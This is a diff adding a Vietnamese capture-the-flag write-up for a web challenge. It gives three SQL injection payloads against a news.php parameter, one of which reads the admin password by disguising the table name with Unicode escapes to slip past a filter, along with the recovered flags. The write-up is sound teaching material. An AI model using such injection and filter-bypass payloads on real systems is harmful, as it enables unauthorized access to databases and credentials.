@@ -117,8 +117,27 @@ show_source(__FILE__);
 
      ![image](https://github.com/TooBunReal/minictf-w1/assets/89735990/2cf03007-7a41-4669-ad4e-36fe9e1bea87)
 
-- Part1 :
+- Part1:
     + Ở news.php, server sẽ nhận một get param tên là name rồi từ đó thực hiện truy vấn.
     + Ta có thể sqli từ đây.
+    + Mục tiêu đầu tiên của chúng ta là flag trong phần serect.
+    + Payload của mình: ```?name=hehehehe'union%20select%20null,flag%20from%20secret--%20-name=guest'%20union%20select```
+    + Part1: ```W1{par1```
+- Part2:
+    + Để tìm được part này thì ta phải có được ```information_schema.tables``` rồi từ đó truy vấn ra flag.
+    + Payload của mình: ```?name=hehehehe'%20union%20select%20null,flag_5959595959408498_5959595959408498%20from%20secret_8489498498112318_8489498498112318--%20-name=hehehehe'%20union%20select```
+    + Part2: ```_part2```  
+- Part3:
+    + Đây có lẽ là phần khó nhất chall này và mình tốn kha khá thời gian để làm nó.
+    + Như đã nói ở trên, mình đã thực hiện nhiều cách để leak ra được pass của admin nhưng điều không có kết quả.
+    + Lúc này mình nhớ tới 2 part trước, mình đã dùng querry để có dc flag, vậy tại sao mình lại không dùng cách tương tự.
+    + Câu trả lời nằm ở việc nếu muốn có được flag thì phải tự hiện querry trên bản USER, nhưng src lại không cho phép điều đó.
+    + Sau hồi khi thử nhiều cách thì mình đã thử chuyển User sang Hex để đánh lừa fillter.
+    + Payload của mình: ```?name=hehehehe%27%20union%20select%20null,password%20from%20u%26%22\0075\0073\0065\0072\0073%22%20where%20username=%27admin%27--%20-```
+    + Flag: ```_part③_ⓓⓔⓙⓐⓥⓤ_福🐳😁}```
+- Flag: ```W1{part1_part2_part③_ⓓⓔⓙⓐⓥⓤ_福🐳😁}```
 
-    
+# Simple Stuff 
+
+- Đây là một chall rất hay, tuy nhiên dù mình chưa thể solve nó kịp giờ thì mình vẫn muốn viết đôi chút về nó.
+- Đầu tiên đây là một trang web dùng để đọc báo lá cãi =)) .
